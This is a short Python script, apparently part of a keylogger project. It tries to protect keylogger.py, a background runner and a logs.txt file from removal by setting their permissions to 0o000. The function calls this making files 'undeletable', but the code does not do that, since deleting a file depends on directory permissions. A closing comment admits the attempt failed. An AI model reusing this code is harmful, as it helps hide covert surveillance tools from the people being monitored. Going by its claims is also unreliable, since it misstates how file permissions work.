import os
# import keylogger
# import background_runner
# import test
# import test1

def make_file_undeletable(filepath):
    try:
        os.chmod(filepath, 0o000) # Set permissions to 0o000 (no permissions)
        print(f"Permissions for '{filepath}' set to 0o000 (no permissions).")
    except OSError as e:
        print(f"Error setting permissions for '{filepath}': {e}")

if __name__ == "__main__":
    make_file_undeletable("logs.txt")
    make_file_undeletable("background_runner.py")
    make_file_undeletable("keylogger.py")
    make_file_undeletable("test.py")
    make_file_undeletable("test1.py")
    
    
    
    
    
    
# Failed can't ,ake file unreadble 